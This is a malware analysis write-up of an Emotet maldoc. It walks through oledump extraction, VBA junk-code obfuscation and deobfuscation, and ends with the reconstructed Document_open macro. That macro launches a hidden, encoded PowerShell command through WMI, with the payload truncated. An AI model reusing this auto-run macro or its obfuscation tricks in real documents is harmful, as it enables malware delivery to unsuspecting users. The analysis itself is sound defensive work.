# Emotet maldoc stage 0

MD5 : 3079af4d01ee6ec51bd3d9911da7e23f

========================================

## Macro extraction

The target file is a word documents (.docx) with some embedeed macro in it.

With `oledump`, we are able to inspect the number of macros and their respecitves names:
```bash
$ /opt/oledump/oledump.py emo.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7544 '1Table'
  5:        97 'Macros/Get4ipjzmjfvp/\x01CompObj'
  6:       296 'Macros/Get4ipjzmjfvp/\x03VBFrame'
  7:       231 'Macros/Get4ipjzmjfvp/f'
  8:       232 'Macros/Get4ipjzmjfvp/o'
  9:       601 'Macros/PROJECT'
 10:       134 'Macros/PROJECTwm'
 11: M    1442 'Macros/VBA/Dw75ayd2hpcab6'
 12: M   34177 'Macros/VBA/Get4ipjzmjfvp'
 13: M    3452 'Macros/VBA/Rk3572j7tam4v8'
 14:     11093 'Macros/VBA/_VBA_PROJECT'
 15:       913 'Macros/VBA/dir'
 16:    134771 'WordDocument'
```

We are interested in the macro n°11, n°12 and n°13.

Let's dump them:
```bash
$ /opt/oledump/oledump.py emo.doc -s 11 -v > /tmp/a
$ /opt/oledump/oledump.py emo.doc -s 12 -v > /tmp/b
$ /opt/oledump/oledump.py emo.doc -s 13 -v > /tmp/c
```

We can now merge thoses files and take a look at them.

I have noticed that one of the variable's value is contained in a graphical form in the document, and that a big blob of obfuscated data is directelly written in the document itself.

We can dump thoses in our extracted macro file, to help us deobfuscate them.

The manual deobfuscation is not that hard, but it is time consuming.

The idea is that a bunch of junk variables are inserted in the middle of the code to makes is harder to spot what's going-on:
```vba
[...]
XayLAAE(DFPEBfGJ) = (Sin(8) + 632 + 555)
[...]
XayLAAE(DFPEBfGJ + DFPEBfGJ) = (QRuDtDeBh + 8952)
XayLAAE(DFPEBfGJ + DFPEBfGJ) = 6 + Oct(4) + ydSHHJF + CDbl(464) + (6107 + jBTBKJJ + gFSXE + Cos(4815))
[...]
ojnIHCE(JoDasPDE) = (Sin(8) + 6 + 40)
[...]
ojnIHCE(JoDasPDE + JoDasPDE) = (JdtFGmA + 5)
ojnIHCE(JoDasPDE + JoDasPDE) = 2 + Oct(7819) + Rwbej + CDbl(9) + (4 + YBDhHCIR + FMTZFCBH + Cos(2894))
[...]
```

Some of them are not references anywhere, as some sort of 'one-shot' dead code:
```vba
[...]
Dim kvQxfB(5 + 8 + 1 + 6) As String
[...]
Dim UCKMD(7 + 7 + 1 + 7) As String
[...]
```

After cleaning thoses, we have to deal with some strings obfuscations, and a lot of not necessary function calls made to obfuscate the execution flow.

In order to gain some time for the next emotet sample that I will encounter, I wrote a simple VBE deobfuscator that remove the dead code used by this emotet version.

After the automated cleaning of the code, the macro look's like this:
```vba
blob = [...]

Private Sub Document_open()
	Get4ipjzmjfvp.X8twf_cydt6

Function X4al3i4glox(Gav481k8nh28)
	X4al3i4glox = Replace(Gav481k8nh28, "][(s)]w", Sxybmdt069cn)

[...]

Function X8twf_cydt6()
	sss = Dw75ayd2hpcab6.StoryRanges.Item(1)
	E6qgao74pfq = "][(s" + ")]wro][(s)]w][(s)]wce][(s)]w" + "s][(s)]ws][(s)]w" + Xta0s1qhuxcif8qqi5
	Op93rci3r56v3hsg = "][(s)]w][(s" + ")]w:][(s)]ww][(s)]win][(s)]w][(s)" + "]w3][(s)]w2][(s)]w_][(s)]w" + Jxjv2dzc048yq4alc6
	K8dgvsqr6fhbct6v = "][(s)]w][(s)]ww" + "][(s)]wi][(s)]wnm][(s)]w][(s)]" + "wgm][(s)]wt][(s)]w][(s)]w" + Jeo_8i41vkli6
	Jv2btd64ezie8rdyer = ChrW("S")
	Sd0hj_y8cq79n589qq = K8dgvsqr6fhbct6v + Jv2btd64ezie8rdyer + Op93rci3r56v3hsg + Get4ipjzmjfvp.Fwder3b7t4tqrecw + E6qgao74pfq
	Amst4ijfvo1r0b5ium = I51m0kjl96lpdcfhm(Sd0hj_y8cq79n589qq)
	Set Rom9dzby5v3unv8 = CreateObject(Amst4ijfvo1r0b5ium)
	Dbx3w8eu9966odzw7 = Mid(sss, 5, Len(sss))
	Gav481k8nh28 = Tvjy9j74xspx0wpf + Amst4ijfvo1r0b5ium + Jv2btd64ezie8rdyer + Get4ipjzmjfvp.Mvskm12if9c843w3 + Get4ipjzmjfvp.Cn8r2cg8i626ztt
	Set Nzkctvs5ewy_ds = Iwfbtu1s0d782jz(Gav481k8nh28 + Get4ipjzmjfvp.Fwder3b7t4tqrecw)
	Rom9dzby5v3unv8. _
	Create AWLDFu7C7y(I51m0kjl96lpdcfhm(Dbx3w8eu9966odzw7)), Kw8r40ymn9ne3xu, Nzkctvs5ewy_ds

Function Iwfbtu1s0d782jz(Wvnulte_7rd74l873)
	Set Iwfbtu1s0d782jz = Rk3572j7tam4v8.Y5ruq1pwxek1348fi(I51m0kjl96lpdcfhm(A1h3yevqvs8 + Wvnulte_7rd74l873 + Hkhlqz9x9h9xvlv))
	Iwfbtu1s0d782jz.XSize = 0
	Iwfbtu1s0d782jz.YSize = 0

Function I51m0kjl96lpdcfhm(St7625txnot)
	Swa7jh9qx56op58nf = (St7625txnot)
	Sxhaen2_r4b3crptm = Dw75ayd2hpcab6.X4al3i4glox(Swa7jh9qx56op58nf)
	I51m0kjl96lpdcfhm = Sxhaen2_r4b3crptm

Function AWLDFu7C7y(AMUjF5h4uz)
	AWLDFu7C7y = Mid(AMUjF5h4uz, 1, 50)
	AWLDFu7C7y = AWLDFu7C7y & Mid(AMUjF5h4uz, i, 1)


Attribute VBA_ModuleType=VBAModule

Function Y5ruq1pwxek1348fi(Hy5393z_cu1)
	Set Y5ruq1pwxek1348fi = CreateObject(Hy5393z_cu1)
```

We can now figure this out by replacing the variable's contents one-by-one, slowly unlocking portions of the code.

At the end, the whole macro can be digest in this small function:
```vba
Private Sub Document_open()
    Set winProcessList = CreateObject("winmgmtS:win32_Process")
    Set winProcessStartup = CreateObject("winmgmtS:win32_ProcessStartuP")
    winProcessStartup.XSize = 0
	winProcessStartup.YSize = 0
    winProcessList. _
    cmd = "POwersheLL -windowstyle hidden -ENCOD IABTAFYAIAAgADAAegBYACAAKABbAFQAeQBQAGUAXQAoACIAewAyAH0AewAwAH0AewA0AH0AewAzAH0[...]AbgAnACsAJwB6AGkAZAAnACkAKwAnAHIAdAAnACkA"	
    Create(cmd, '', winProcessStartup)
```
